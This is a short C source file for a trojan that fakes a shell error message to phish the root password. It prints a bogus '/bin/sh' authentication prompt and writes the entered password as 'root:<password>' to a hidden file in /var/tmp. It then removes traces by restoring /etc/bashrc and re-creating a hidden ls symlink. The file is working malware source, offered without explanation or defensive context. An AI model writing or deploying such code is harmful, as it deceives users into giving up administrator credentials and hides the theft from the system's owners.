#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[]){

FILE *fp;
char *user;
char *pass;
char filex[100];
char clean[100];

sprintf(filex,"/var/tmp/.syscache.log");
sprintf(clean,"rm -rf /var/tmp/.ls;mv -f /etc/bashrc.bak /etc/bashrc");

user="root";

fprintf(stdout,"/bin/sh: An unknown error occured and confirm your password:\n");
fprintf(stdout,"Password: "); pass=getpass ("");
system("sleep 3");
fprintf(stdout,"/bin/sh: Authentication success.\n");
if ((fp=fopen(filex,"w")) != NULL)
   {
   fprintf(fp, "%s:%s\n", user, pass);
   fclose(fp);
   }

system(clean);
system("rm -rf /var/tmp/.ls; ln -s /bin/ls /var/tmp/.ls");

}
